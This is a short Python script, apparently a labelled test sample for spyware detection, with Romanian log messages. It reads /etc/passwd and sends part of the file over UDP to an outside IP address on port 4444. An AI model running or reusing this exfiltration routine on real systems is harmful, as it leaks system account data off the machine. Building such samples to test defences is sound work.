import socket
import time
import os

SENSITIVE_FILE = "/etc/passwd"   
EXTERNAL_IP = "8.8.8.8"           
EXTERNAL_PORT = 4444            

def main():
    print(f"[TEST][SPYWARE] PID propriu: {os.getpid()}")

    
    print(f"[TEST][SPYWARE] citesc fisierul sensibil: {SENSITIVE_FILE}")
    with open(SENSITIVE_FILE, "r") as f:
        data = f.read()
    print(f"[TEST][SPYWARE] am citit {len(data)} bytes")

    
    time.sleep(0.5)   
    print(f"[TEST][SPYWARE] trimit date catre {EXTERNAL_IP}:{EXTERNAL_PORT}")

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)   # UDP, nu are nevoie de handshake
    try:
        sock.sendto(data[:100].encode(), (EXTERNAL_IP, EXTERNAL_PORT))
        print("[TEST][SPYWARE] date trimise (UDP, fara raspuns necesar)")
    except Exception as e:
        print(f"[TEST][SPYWARE] eroare la trimitere: {e}")
    finally:
        sock.close()

    print("[TEST][SPYWARE] test terminat")

if __name__ == "__main__":
    main()
